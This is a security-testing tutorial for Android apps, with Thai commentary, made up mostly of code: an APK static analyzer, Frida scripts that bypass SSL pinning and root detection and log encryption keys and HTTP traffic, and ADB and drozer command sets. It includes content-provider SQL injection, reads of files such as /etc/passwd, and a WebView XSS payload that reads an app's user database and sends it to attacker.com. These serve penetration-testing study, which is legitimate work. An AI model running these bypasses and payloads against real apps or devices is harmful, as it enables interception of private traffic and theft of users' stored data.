# Part 61: Mobile Security - Android (Steps 601-610)

## Step 601: Android APK Analysis

การวิเคราะห์ APK ทั้งแบบ static และ dynamic

```python
import subprocess
import os
import json
import zipfile
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import re
import hashlib

@dataclass
class AndroidFinding:
    severity: str
    category: str
    title: str
    description: str
    location: str = ""
    line_number: int = 0

class APKAnalyzer:
    def __init__(self, apk_path: str):
        self.apk_path = Path(apk_path)
        self.output_dir = Path("/tmp/apk_analysis")
        self.output_dir.mkdir(exist_ok=True)
        self.findings: List[AndroidFinding] = []
    
    def calculate_hashes(self) -> dict:
        """Calculate file hashes for APK"""
        hashes = {}
        with open(self.apk_path, 'rb') as f:
            content = f.read()
            hashes['md5'] = hashlib.md5(content).hexdigest()
            hashes['sha256'] = hashlib.sha256(content).hexdigest()
            hashes['sha1'] = hashlib.sha1(content).hexdigest()
        return hashes
    
    def extract_apk(self) -> Path:
        """Extract APK contents"""
        extract_dir = self.output_dir / "extracted"
        extract_dir.mkdir(exist_ok=True)
        
        with zipfile.ZipFile(self.apk_path, 'r') as apk:
            apk.extractall(extract_dir)
        
        return extract_dir
    
    def decompile_with_jadx(self) -> str:
        """Decompile APK using JADX"""
        output_dir = str(self.output_dir / "jadx_output")
        cmd = ['jadx', '-d', output_dir, str(self.apk_path)]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[+] JADX decompilation successful: {output_dir}")
        else:
            print(f"[-] JADX error: {result.stderr[:200]}")
        
        return output_dir
    
    def parse_manifest(self, apk_extract_dir: Path) -> dict:
        """Parse AndroidManifest.xml"""
        manifest_path = apk_extract_dir / "AndroidManifest.xml"
        
        if not manifest_path.exists():
            # Try decoded manifest from apktool
            manifest_path = self.output_dir / "apktool_output" / "AndroidManifest.xml"
        
        # Use apktool to decode binary XML
        apktool_dir = str(self.output_dir / "apktool_output")
        subprocess.run(
            ['apktool', 'd', str(self.apk_path), '-o', apktool_dir, '-f'],
            capture_output=True
        )
        
        manifest_decoded = Path(apktool_dir) / "AndroidManifest.xml"
        
        if not manifest_decoded.exists():
            return {"error": "Could not decode manifest"}
        
        with open(manifest_decoded, 'r') as f:
            content = f.read()
        
        results = {
            "package": re.search(r'package="([^"]+)"', content),
            "min_sdk": re.search(r'minSdkVersion="([^"]+)"', content),
            "target_sdk": re.search(r'targetSdkVersion="([^"]+)"', content),
            "permissions": re.findall(r'uses-permission android:name="([^"]+)"', content),
            "exported_activities": [],
            "exported_services": [],
            "exported_receivers": [],
            "exported_providers": [],
            "debuggable": 'android:debuggable="true"' in content,
            "allow_backup": 'android:allowBackup="true"' in content,
            "network_security_config": 'android:networkSecurityConfig' in content
        }
        
        # Extract values
        results["package"] = results["package"].group(1) if results["package"] else "unknown"
        results["min_sdk"] = results["min_sdk"].group(1) if results["min_sdk"] else "unknown"
        results["target_sdk"] = results["target_sdk"].group(1) if results["target_sdk"] else "unknown"
        
        # Find exported components
        exported_pattern = r'<(activity|service|receiver|provider)[^>]*android:exported="true"[^>]*android:name="([^"]+)"'
        for match in re.finditer(exported_pattern, content):
            comp_type = match.group(1)
            comp_name = match.group(2)
            results[f"exported_{comp_type}s"].append(comp_name)
        
        # Check for dangerous permissions
        dangerous_permissions = [
            'READ_CONTACTS', 'WRITE_CONTACTS', 'ACCESS_FINE_LOCATION',
            'READ_CALL_LOG', 'PROCESS_OUTGOING_CALLS', 'READ_SMS',
            'SEND_SMS', 'RECORD_AUDIO', 'CAMERA', 'READ_EXTERNAL_STORAGE',
            'WRITE_EXTERNAL_STORAGE', 'GET_ACCOUNTS'
        ]
        
        for perm in results["permissions"]:
            for dangerous in dangerous_permissions:
                if dangerous in perm:
                    self.findings.append(AndroidFinding(
                        severity="MEDIUM",
                        category="Permissions",
                        title=f"Dangerous permission: {dangerous}",
                        description=f"App requests {perm}",
                        location="AndroidManifest.xml"
                    ))
        
        # Check security issues
        if results["debuggable"]:
            self.findings.append(AndroidFinding(
                severity="HIGH",
                category="Configuration",
                title="Debuggable application",
                description="android:debuggable=true allows debug access to the app",
                location="AndroidManifest.xml"
            ))
        
        if results["allow_backup"]:
            self.findings.append(AndroidFinding(
                severity="MEDIUM",
                category="Configuration",
                title="Backup enabled",
                description="android:allowBackup=true allows ADB backup of app data",
                location="AndroidManifest.xml"
            ))
        
        return results
    
    def scan_source_code(self, jadx_dir: str) -> List[AndroidFinding]:
        """Scan decompiled source code for security issues"""
        findings = []
        jadx_path = Path(jadx_dir)
        
        # Patterns to search for
        patterns = [
            ("CRITICAL", "Hardcoded Password", r'[Pp]assword\s*=\s*"[^"]+"', "password"),
            ("CRITICAL", "Hardcoded API Key", r'[Aa][Pp][Ii]_?[Kk]ey\s*=\s*"[^"]{20,}"', "api_key"),
            ("CRITICAL", "Hardcoded Secret", r'[Ss]ecret\s*=\s*"[^"]{10,}"', "secret"),
            ("HIGH", "SQLi Vulnerability", r'rawQuery\s*\([^,]+\+', "sql"),
            ("HIGH", "WebView JavaScript", r'setJavaScriptEnabled\(true\)', "webview"),
            ("HIGH", "WebView File Access", r'setAllowFileAccess\(true\)', "webview"),
            ("HIGH", "Insecure Random", r'new\s+Random\(\)', "crypto"),
            ("HIGH", "DES/MD5 Usage", r'getInstance\("(DES|MD5|SHA1|RC4|RC2)"\)', "crypto"),
            ("MEDIUM", "HTTP URL", r'http://[a-zA-Z0-9]+', "network"),
            ("MEDIUM", "External Storage", r'getExternalStorage|getExternalFilesDir', "storage"),
            ("MEDIUM", "Log Sensitive Data", r'Log\.([dviwe])\([^)]*[Pp]assword', "logging"),
            ("LOW", "Clipboard Access", r'ClipboardManager', "data_exposure")
        ]
        
        java_files = list(jadx_path.rglob("*.java"))
        
        for java_file in java_files:
            try:
                with open(java_file, 'r', errors='ignore') as f:
                    content = f.read()
                    lines = content.split('\n')
                
                for severity, title, pattern, category in patterns:
                    for i, line in enumerate(lines, 1):
                        if re.search(pattern, line):
                            findings.append(AndroidFinding(
                                severity=severity,
                                category=category,
                                title=title,
                                description=f"Found in {java_file.name}",
                                location=str(java_file.relative_to(jadx_path)),
                                line_number=i
                            ))
            except Exception:
                pass
        
        return findings
    
    def run_mobsf_analysis(self, apk_path: str, api_key: str = "sample_api_key",
                            server: str = "http://127.0.0.1:8000") -> dict:
        """Upload to MobSF for automated analysis"""
        import requests
        
        # Upload APK
        with open(apk_path, 'rb') as f:
            upload_r = requests.post(
                f"{server}/api/v1/upload",
                files={'file': (os.path.basename(apk_path), f, 'application/octet-stream')},
                headers={'Authorization': api_key}
            )
        
        if upload_r.status_code != 200:
            return {"error": f"Upload failed: {upload_r.text}"}
        
        file_hash = upload_r.json().get('hash')
        
        # Run scan
        scan_r = requests.post(
            f"{server}/api/v1/scan",
            data={'scan_type': 'apk', 'file_name': os.path.basename(apk_path), 'hash': file_hash},
            headers={'Authorization': api_key}
        )
        
        # Get report
        report_r = requests.get(
            f"{server}/api/v1/report_json?hash={file_hash}",
            headers={'Authorization': api_key}
        )
        
        return report_r.json() if report_r.status_code == 200 else {"error": "Report failed"}
    
    def generate_report(self) -> str:
        """Generate APK analysis report"""
        report = f"Android APK Security Analysis\n{'='*40}\n"
        report += f"APK: {self.apk_path.name}\n"
        report += f"Total Findings: {len(self.findings)}\n\n"
        
        # Group by severity
        by_severity = {}
        for f in self.findings:
            by_severity.setdefault(f.severity, []).append(f)
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            if severity in by_severity:
                report += f"\n{severity} Issues:\n{'-'*30}\n"
                for finding in by_severity[severity]:
                    report += f"  [{finding.category}] {finding.title}\n"
                    report += f"    {finding.description}\n"
                    if finding.location:
                        report += f"    Location: {finding.location}:{finding.line_number}\n"
        
        return report

if __name__ == '__main__':
    # Usage: analyzer = APKAnalyzer('/path/to/app.apk')
    print("[*] APK Analyzer - Tools required: jadx, apktool, mobsf")
    print("[*] Install: apt install jadx apktool")
    print("[*] MobSF: docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf")
    print("\n[*] Quick analysis commands:")
    print("  jadx -d output app.apk         # Decompile to Java")
    print("  apktool d app.apk -o output    # Decode resources")
    print("  dex2jar app.apk                # Convert to JAR")
    print("  jd-gui app.jar                 # Decompile JAR")
```

## Step 602: Android Dynamic Analysis with Frida

Frida สำหรับ dynamic instrumentation ของ Android apps

```python
FRIDA_SCRIPTS = {
    "ssl_pinning_bypass": """
// Frida script: Bypass SSL Certificate Pinning
// Usage: frida -U -l ssl_bypass.js -f com.target.app

Java.perform(function() {
    // Bypass TrustManager
    var TrustManager = Java.registerClass({
        name: 'com.frida.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', 
        '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')
        .implementation = function(km, tm, sr) {
            this.init(km, [TrustManager.$new()], sr);
        };
    
    // OkHttp SSL Pinning
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] OkHttp CertPinner bypassed');
        };
        CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function() {
            console.log('[+] OkHttp CertPinner (v2) bypassed');
        };
    } catch(e) {}
    
    // TrustKit
    try {
        var OkHostnameVerifier = Java.use('okhttp3.internal.tls.OkHostnameVerifier');
        OkHostnameVerifier.verify.overload('java.lang.String', 
            'javax.net.ssl.SSLSession').implementation = function() {
            return true;
        };
    } catch(e) {}
    
    console.log('[+] SSL Pinning bypass loaded');
});
""",
    
    "root_detection_bypass": """
// Frida script: Bypass Root Detection
Java.perform(function() {
    // Common root detection methods
    
    // Method 1: RootBeer
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() {
            console.log('[+] RootBeer.isRooted() bypassed');
            return false;
        };
    } catch(e) {}
    
    // Method 2: Check for su binary
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.includes('su') || cmd.includes('which su')) {
            console.log('[+] su check intercepted: ' + cmd);
            // Return harmless command
            return this.exec('ls');
        }
        return this.exec(cmd);
    };
    
    // Method 3: File.exists() for root indicators
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootPaths = ['/su', '/system/bin/su', '/sbin/su', '/system/xbin/su',
                         '/system/app/Superuser.apk', '/data/local/bin/su'];
        if (rootPaths.some(p => path.includes(p))) {
            console.log('[+] File.exists() bypassed for: ' + path);
            return false;
        }
        return this.exists();
    };
    
    // Method 4: System properties check
    var SystemProperties = Java.use('android.os.SystemProperties');
    SystemProperties.get.overload('java.lang.String').implementation = function(key) {
        if (key === 'ro.debuggable' || key === 'ro.secure') {
            return '0';
        }
        return this.get(key);
    };
    
    console.log('[+] Root detection bypass loaded');
});
""",
    
    "crypto_monitor": """
// Frida script: Monitor Cryptographic Operations
Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    
    Cipher.doFinal.overload('[B').implementation = function(input) {
        var result = this.doFinal(input);
        
        console.log('=== Cipher.doFinal ===');
        console.log('Mode: ' + this.getAlgorithm());
        console.log('Input (hex): ' + bytesToHex(input));
        console.log('Output (hex): ' + bytesToHex(result));
        
        return result;
    };
    
    var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algorithm) {
        console.log('=== SecretKeySpec ===');
        console.log('Algorithm: ' + algorithm);
        console.log('Key (hex): ' + bytesToHex(key));
        return this.$init(key, algorithm);
    };
    
    function bytesToHex(bytes) {
        if (!bytes) return 'null';
        var hex = [];
        for (var i = 0; i < bytes.length; i++) {
            hex.push(('0' + (bytes[i] & 0xFF).toString(16)).slice(-2));
        }
        return hex.join('');
    }
    
    console.log('[+] Crypto monitor loaded');
});
""",
    
    "intent_monitor": """
// Frida script: Monitor Android Intents
Java.perform(function() {
    var ActivityClass = Java.use('android.app.Activity');
    
    ActivityClass.startActivity.overload('android.content.Intent').implementation = function(intent) {
        console.log('=== startActivity ===');
        console.log('Action: ' + intent.getAction());
        console.log('Data: ' + intent.getData());
        console.log('Component: ' + intent.getComponent());
        
        var extras = intent.getExtras();
        if (extras) {
            var keys = extras.keySet();
            keys.forEach(function(key) {
                console.log('Extra: ' + key + ' = ' + extras.get(key));
            });
        }
        
        return this.startActivity(intent);
    };
    
    // Monitor broadcasts
    var ContextWrapper = Java.use('android.content.ContextWrapper');
    ContextWrapper.sendBroadcast.overload('android.content.Intent').implementation = function(intent) {
        console.log('=== sendBroadcast ===');
        console.log('Action: ' + intent.getAction());
        return this.sendBroadcast(intent);
    };
    
    console.log('[+] Intent monitor loaded');
});
""",
    
    "network_monitor": """
// Frida script: Monitor Network Traffic
Java.perform(function() {
    // Monitor OkHttp
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Request = Java.use('okhttp3.Request');
        var Response = Java.use('okhttp3.Response');
        
        var RealCall = Java.use('okhttp3.internal.connection.RealCall');
        RealCall.execute.implementation = function() {
            var request = this.request();
            console.log('=== HTTP Request ===');
            console.log('URL: ' + request.url());
            console.log('Method: ' + request.method());
            
            var headers = request.headers();
            for (var i = 0; i < headers.size(); i++) {
                console.log('Header: ' + headers.name(i) + ': ' + headers.value(i));
            }
            
            var body = request.body();
            if (body) {
                var buffer = Java.use('okio.Buffer').$new();
                body.writeTo(buffer);
                console.log('Body: ' + buffer.readUtf8());
            }
            
            var response = this.execute();
            console.log('Response Code: ' + response.code());
            return response;
        };
    } catch(e) {
        console.log('OkHttp not found: ' + e);
    }
    
    console.log('[+] Network monitor loaded');
});
"""
}

class FridaAndroidTester:
    def generate_usage_commands(self, package_name: str) -> dict:
        """Generate Frida usage commands"""
        return {
            "install_frida": [
                "pip install frida-tools",
                "# Download frida-server for Android",
                "# https://github.com/frida/frida/releases",
                "adb push frida-server /data/local/tmp/",
                "adb shell chmod 755 /data/local/tmp/frida-server",
                "adb shell /data/local/tmp/frida-server &"
            ],
            "attach_to_running": [
                f"frida -U {package_name} -l script.js",
                f"frida -U -p <pid> -l script.js"
            ],
            "spawn_process": [
                f"frida -U -f {package_name} -l script.js --no-pause"
            ],
            "list_apps": [
                "frida-ps -Ua  # List running apps",
                "frida-ps -Uai # List installed apps"
            ],
            "ssl_bypass": [
                f"frida -U -f {package_name} -l ssl_pinning_bypass.js --no-pause",
                "# Then configure BurpSuite proxy on device",
                "# Settings -> WiFi -> Proxy -> Manual -> BurpSuite IP:8080"
            ]
        }
    
    def check_app_storage(self, package_name: str) -> dict:
        """Check app local storage for sensitive data"""
        storage_commands = {
            "shared_preferences": [
                f"adb shell run-as {package_name} ls /data/data/{package_name}/shared_prefs/",
                f"adb shell run-as {package_name} cat /data/data/{package_name}/shared_prefs/*.xml"
            ],
            "sqlite_databases": [
                f"adb shell run-as {package_name} ls /data/data/{package_name}/databases/",
                f"adb shell run-as {package_name} sqlite3 /data/data/{package_name}/databases/main.db .tables",
                f"adb pull /data/data/{package_name}/databases/main.db /tmp/"
            ],
            "files": [
                f"adb shell run-as {package_name} find /data/data/{package_name} -type f",
                f"adb shell ls -la /sdcard/Android/data/{package_name}/"
            ],
            "keystore": [
                "# Check for keys in Android Keystore",
                f"adb shell run-as {package_name} ls /data/data/{package_name}/.android_keystore"
            ]
        }
        return storage_commands
    
    def test_deeplink_vulnerabilities(self, package_name: str, 
                                       uri_scheme: str) -> List[str]:
        """Test deeplink/intent vulnerabilities"""
        test_commands = [
            # Test deeplink handling
            f"adb shell am start -a android.intent.action.VIEW -d '{uri_scheme}://test?param=value' {package_name}",
            # XSS via deeplink
            f"adb shell am start -a android.intent.action.VIEW -d '{uri_scheme}://test?page=<script>alert(1)</script>' {package_name}",
            # Path traversal
            f"adb shell am start -a android.intent.action.VIEW -d '{uri_scheme}://test?file=../../../etc/passwd' {package_name}",
            # Open redirect
            f"adb shell am start -a android.intent.action.VIEW -d '{uri_scheme}://test?redirect=https://evil.com' {package_name}",
            # Intent extra injection
            f"adb shell am start -n {package_name}/com.target.MainActivity --es 'param' 'value' --ez 'boolean' true"
        ]
        return test_commands

if __name__ == '__main__':
    # Save Frida scripts
    for script_name, script_content in FRIDA_SCRIPTS.items():
        print(f"[*] Script: {script_name} ({len(script_content)} chars)")
    
    tester = FridaAndroidTester()
    cmds = tester.generate_usage_commands("com.example.app")
    
    print("\n[*] Frida Setup Commands:")
    for step in cmds['install_frida']:
        print(f"  {step}")
    
    print("\n[*] SSL Pinning Bypass:")
    for cmd in cmds['ssl_bypass']:
        print(f"  {cmd}")
```

## Step 603-610: Android Exploitation & Security Testing

```python
import subprocess
import os
from typing import List, Dict

class AndroidPenTester:
    def adb_commands_reference(self) -> dict:
        """ADB commands for Android pentesting"""
        return {
            "device_info": [
                "adb devices                              # List connected devices",
                "adb shell getprop ro.product.model       # Device model",
                "adb shell getprop ro.build.version.release # Android version",
                "adb shell getprop ro.build.version.sdk   # API level",
                "adb shell getprop ro.secure              # Secure boot",
                "adb shell getprop ro.debuggable          # Debuggable",
                "adb shell id                             # Current user"
            ],
            "app_management": [
                "adb install app.apk                      # Install APK",
                "adb shell pm list packages               # List all packages",
                "adb shell pm list packages -3            # List 3rd party apps",
                "adb shell pm dump com.target.app        # App details",
                "adb shell pm path com.target.app        # APK path",
                "adb pull /data/app/com.target.app-1/base.apk  # Pull APK"
            ],
            "file_system": [
                "adb shell ls /data/data/com.target.app   # App data",
                "adb pull /data/data/com.target.app /tmp/ # Pull app data",
                "adb shell find / -name '*.db' 2>/dev/null # Find databases",
                "adb shell cat /proc/net/tcp              # Network connections"
            ],
            "network": [
                "adb shell netstat -tunp                  # Network connections",
                "adb shell tcpdump -i any -w /sdcard/capture.pcap # Capture traffic",
                "adb pull /sdcard/capture.pcap            # Pull pcap",
                "adb shell settings put global http_proxy <IP>:<PORT> # Set proxy",
                "adb shell settings delete global http_proxy # Remove proxy"
            ],
            "activity_manipulation": [
                "adb shell am start -n com.target/.MainActivity # Launch activity",
                "adb shell am force-stop com.target.app   # Stop app",
                "adb shell am broadcast -a com.target.CUSTOM_ACTION # Send broadcast",
                "adb shell content query --uri content://com.target.provider/ # Query provider"
            ]
        }
    
    def bypass_certificate_pinning_methods(self) -> List[dict]:
        """Multiple methods to bypass SSL pinning"""
        return [
            {
                "method": "Frida Script",
                "effectiveness": "High",
                "commands": [
                    "frida -U -f com.target.app -l ssl_bypass.js --no-pause"
                ]
            },
            {
                "method": "Objection",
                "effectiveness": "High",
                "commands": [
                    "pip install objection",
                    "objection -g com.target.app explore",
                    "android sslpinning disable"
                ]
            },
            {
                "method": "APK Patching with apktool",
                "effectiveness": "Medium",
                "commands": [
                    "apktool d app.apk -o app_decoded",
                    "# Edit network_security_config.xml or smali code",
                    "apktool b app_decoded -o patched.apk",
                    "keytool -genkey -v -keystore my.keystore -alias alias -keyalg RSA -validity 10000",
                    "jarsigner -verbose -keystore my.keystore patched.apk alias"
                ]
            },
            {
                "method": "Xposed/LSPosed Module",
                "effectiveness": "High",
                "requirements": "Rooted device with Xposed/LSPosed installed",
                "modules": ["TrustMeAlready", "SSLUnpinning", "JustTrustMe"]
            }
        ]
    
    def run_drozer_tests(self, package_name: str) -> str:
        """Drozer testing commands for Android"""
        return f"""
# Install drozer agent on device
# Connect: adb forward tcp:31415 tcp:31415
# Start: drozer console connect

# App attack surface
dz> run app.package.info -a {package_name}
dz> run app.package.attacksurface {package_name}

# Activities
dz> run app.activity.info -a {package_name}
dz> run app.activity.start --component {package_name} com.target.LoginActivity

# Content providers
dz> run app.provider.info -a {package_name}
dz> run app.provider.finduri {package_name}
dz> run app.provider.query content://com.target.provider/
dz> run app.provider.query content://com.target.provider/ --projection "* FROM users--"

# SQL injection in content providers
dz> run app.provider.query content://com.target.provider/users \\
    --selection "1=1)")--

# Services  
dz> run app.service.info -a {package_name}
dz> run app.service.start --action com.target.SERVICE_ACTION --component {package_name} com.target.MyService

# Broadcast receivers
dz> run app.broadcast.info -a {package_name}
dz> run app.broadcast.send --action com.target.CUSTOM_ACTION \\
    --extra string key value

# File read via content provider
dz> run app.provider.read content://com.target.provider/etc/passwd
dz> run app.provider.download content://com.target.provider/sdcard/sensitive.db /tmp/
        """
    
    def test_webview_vulnerabilities(self) -> List[dict]:
        """Test WebView vulnerabilities"""
        return [
            {
                "vulnerability": "JavaScript Bridge Injection",
                "description": "Exposed Java object via addJavascriptInterface",
                "test": """
// In WebView that loads attacker-controlled content:
<script>
// If 'Android' bridge is exposed:
Android.getDeviceId();
Android.readFile('/etc/passwd');

// Enumerate all methods
Object.getOwnPropertyNames(Android);
</script>
                """
            },
            {
                "vulnerability": "File:// Access via WebView",
                "description": "WebView can read local files if setAllowFileAccess(true)",
                "test": """
// Craft deeplink that loads file:// URL:
deeplink://open?url=file:///data/data/com.target.app/shared_prefs/prefs.xml
// Or via XSS:
<script>document.location='file:///etc/hosts'</script>
                """
            },
            {
                "vulnerability": "Universal XSS",
                "description": "XSS in WebView can access file:// if allowUniversalAccessFromFileURLs=true",
                "test": """
// Create malicious HTML:
<script>
var req = new XMLHttpRequest();
req.open('GET', 'file:///data/data/com.target.app/databases/users.db', false);
req.send();
var exfil = btoa(req.responseText);
new Image().src = 'https://attacker.com/?data=' + exfil;
</script>
                """
            }
        ]
    
    def android_backup_extraction(self, package_name: str) -> List[str]:
        """Extract data via Android backup"""
        return [
            f"adb backup -f backup.ab -noapk {package_name}",
            "# Convert backup to tar:",
            "dd if=backup.ab bs=24 skip=1 | python -c 'import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))' | tar xvf -",
            "# Or use ABE (Android Backup Extractor):",
            "java -jar abe.jar unpack backup.ab backup.tar",
            "tar xvf backup.tar",
            f"ls -la apps/{package_name}/"
        ]

if __name__ == '__main__':
    tester = AndroidPenTester()
    
    # ADB commands reference
    cmds = tester.adb_commands_reference()
    print("[*] Android Pentest Commands:")
    for category, commands in cmds.items():
        print(f"\n  {category}:")
        for cmd in commands[:2]:
            print(f"    {cmd}")
    
    # SSL Pinning bypass methods
    methods = tester.bypass_certificate_pinning_methods()
    print("\n[*] SSL Pinning Bypass Methods:")
    for method in methods:
        print(f"  - {method['method']}: {method['effectiveness']} effectiveness")
    
    # WebView vulns
    webview_vulns = tester.test_webview_vulnerabilities()
    print("\n[*] WebView Vulnerabilities:")
    for vuln in webview_vulns:
        print(f"  - {vuln['vulnerability']}: {vuln['description'][:60]}")
```
